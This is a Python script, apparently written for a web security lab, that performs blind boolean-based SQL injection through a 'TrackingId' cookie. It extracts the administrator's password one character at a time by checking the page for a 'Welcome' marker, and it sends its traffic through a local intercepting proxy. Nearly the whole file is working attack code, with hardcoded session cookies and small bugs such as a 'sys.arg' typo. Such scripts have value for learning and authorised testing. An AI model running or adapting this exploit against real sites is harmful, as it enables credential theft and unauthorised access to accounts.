import sys
import requests
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


# update value of 'TrackingId' and 'session'
def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):  # running it for only the first password character. Change this to password length + 1
        for j in range(32, 126):
            sqli_payload = "' AND (SELECT ascii(SUBSTRING(password,%s,1)) FROM users WHERE username='administrator')='%s'--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookie = {'TrackingId': 'UYEU3G4y3oIsS2cm' + sqli_payload_encoded,
                      'session': 'GALwF7dpnQ2RoA8lSrB6JHP1PG6bdmQL'}
            r = requests.get(url, cookies=cookie,
                             verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.arg[0])
        # sys.exit(-1)
    url = sys.argv[1].strip()
    print("[+] Retrieving the administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()


"http://docs.python.org:80/3/library/urllib.parse.html?"
"highlight=params#url-parsing"
